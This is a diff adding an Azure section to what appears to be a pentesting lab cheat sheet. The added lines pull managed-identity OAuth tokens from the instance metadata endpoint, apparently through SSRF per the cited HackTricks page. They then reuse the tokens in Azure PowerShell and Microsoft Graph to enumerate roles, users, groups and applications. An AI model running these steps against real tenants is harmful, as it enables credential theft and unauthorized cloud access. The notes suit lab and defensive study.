@@ -37,3 +37,42 @@ List all manages policies that are attached to the specified IAM user : `aws iam
 Lists all managed policies that are attached to the specified IAM Group : `aws iam list-attached-group-policies --group-name [group-name] --profile ec2`
 
 ## AZURE
+
+**References:** 
+
+- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#cea8
+
+**Commands:** 
+
+**Note:** API Version in this lab -> 2018-02-01
+
+Instance Details: `curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=[API-VERSION]"`
+
+Retrieve Management Token: `curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=[API-VERSION]&resource=https://management.azure.com/"`
+
+Retrieve Graph Token: `curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=[API-VERSION]&resource=https://graph.microsoft.com/"`
+
+**Note:** Decode JWT Token to retrieve data.
+
+Configure access token in az powershell cli:
+
+1. `$token = “AccessToken”`	
+2. `Connect-AzAccount -AccessToken $token -AccountId [Tenant ID]`
+
+Get role assignment of managed identity: `Get-AzRoleAssignment -ObjectId [PrincipalID-ManagedIdentity]`
+
+List role assignment: `Get-AzRoleAssignment`
+
+Get role assignment of name: `Get-AzroleDefinition  -Name [RoleDefinitionName]`
+
+Connect to Graph using token: `$token = "[TOKEN]" ; Connect-MgGraph -AccessToken ($token |ConvertTo-SecureString -AsPlainText -Force)`
+
+Enumerate Groups: `Get-MgGroup`
+
+Enumerate Group Membership: `Get-MgGroupMember -GroupId [GroupId]`
+
+Enumerate Users: `Get-MgUser`
+
+Enumerate Applications: `Get-MgApplication`
+
+Enumerate Application Owner: `Get-MgApplicationOwner -ApplicationId "[ID]"`
